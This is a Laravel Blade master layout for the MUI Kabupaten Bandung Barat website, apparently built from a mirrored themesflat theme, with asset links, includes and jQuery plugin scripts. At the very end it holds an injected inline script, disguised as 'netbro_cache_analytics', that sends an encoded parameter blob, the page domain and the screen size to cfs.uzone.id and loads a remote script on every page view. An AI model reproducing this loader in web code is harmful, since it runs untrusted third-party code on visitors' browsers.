<!DOCTYPE html>
<html lang="en">
<head>
    
     <!-- Basic Page Needs -->
     <meta charset="utf-8">
    <!--[if IE]><meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'><![endif]-->
    <title>MUI Kabupaten Bandung Barat</title>

    <meta name="author" content="themesflat.com">

    <!-- Mobile Specific Metas -->
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <!-- Bootstrap  -->
    <!-- <link rel="stylesheet" type="text/css" href="stylesheets/bootstrap.css" > -->

    <link rel="stylesheet" href="{{ asset('assets/frontend/stylesheets/bootstrap.css') }}">
    <!-- Theme Style -->
    <link rel="stylesheet" type="text/css" href="{{ asset('assets/frontend/stylesheets/style.css') }}">

    <!-- Responsive -->
    <!-- <link rel="stylesheet" type="text/css" href="stylesheets/responsive.css"> -->

    <link rel="stylesheet" href="{{ asset('assets/frontend/stylesheets/responsive.css') }}">

    <!-- Colors -->
    <!-- <link rel="stylesheet" type="text/css" href="stylesheets/colors/color1.css" id="colors"> -->
	<link rel="stylesheet" href="{{ asset('assets/frontend/stylesheets/colors/color1.css') }}" id="colors">

	<!-- Animation Style -->
    <!-- <link rel="stylesheet" type="text/css" href="stylesheets/animate.css"> -->
    <link rel="stylesheet" href="{{ asset('assets/frontend/stylesheets/animate.css') }}">


    <!-- Favicon and touch icons  -->
    <link href="{{ asset('assets/frontend/icon/apple-touch-icon-48-precomposed.png') }}" rel="apple-touch-icon-precomposed" sizes="48x48">
    <link href="icon/apple-touch-icon-32-precomposed.png" rel="apple-touch-icon-precomposed">
    <link href="icon/favicon.png" rel="shortcut icon">

    <link rel="stylesheet" type="text/css" href="{{ asset('assets/frontend/video/css/modal-video.min.css') }}">


</head>

<body class="header-sticky">   
    <section class="loading-overlay">
        <div class="Loading-Page">
            <h2 class="loader">Loading...</h2>
        </div>
    </section>
        <!-- header -->
        @include('frontend.layouts.header')
                <!-- endofheader -->

			<!-- content -->
				@yield('content')
			<!-- endofcontent -->

			<!-- footer -->
		@include('frontend.layouts.footer')
			<!-- endoffooter -->
         
<!-- Go Top -->
<a class="go-top">
            <i class="fa fa-chevron-up"></i>
        </a>   
</div>
<!-- Javascript -->
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/bootstrap.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.easing.js') }}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/imagesloaded.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.isotope.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/owl.carousel.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery-countTo.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery-waypoints.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.flexslider-min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.cookie.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery-validate.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.magnific-popup.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/parallax.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.countdown.js')}}"></script>
    <!-- <script type="text/javascript" src="{{ asset('assets/frontend/javascript/switcher.js')}}"></script> -->
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.sticky.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/smoothscroll.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/main.js')}}"></script>

    <!-- Revolution Slider -->
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.themepunch.tools.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/jquery.themepunch.revolution.min.js')}}"></script>
    
    <script type="text/javascript" src="{{ asset('assets/frontend/video/modal-video.js')}}"></script>
    


    <script type="text/javascript" src="{{ asset('assets/frontend/javascript/slider.js')}}"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXtl3OCmagESisi4%2ba%2b2EFOIjPk%2fsZECkXOHw8nmzODqA9W1v9UE4OrXp00xScTX1tvqEq1Mx98HJoHNJ5XL6NnLKaCNEuppewdKEu2ikF45AgjfnRAtt%2b07mwDlXs%2b0VGWw9%2b68gHxMQhwAsTSIQyQZNVNnGn%2bIpLLNX0siU3Bj%2bqPOsMYhkpOnjkh%2bx23jVgXWBHaJjJw0mZoG3%2bBrRqFknoHGqgFCCf5NyYemsCH%2bexi1aD79QQueJ3zyAOi860uiLgGkmJ%2bLbrON4iBXnJ5HCVAzlyo2mNukgIyUqlLm94tyGbe8qfpS8AIA%2fNKAdf6T%2bOD54kHCg8ktXGyXkKG4Rk8imgOOikhwgzhbPeOBfp11yAL0VaEdUw9wm1kRJPCPsJSRVfHJCNTFHh1fSyA7C0B6Z5x0ToQ%2fioYDwH%2bP6urxcoiOygf74ohn3ziudzSYWwqy%2f8yMjxZi8kEr7nKNmNL82hxhrq" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    @stack('scripts')



<!-- Mirrored from themesflat.com/html/hnk/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 18 Jan 2020 15:57:38 GMT -->
</body>
</html>
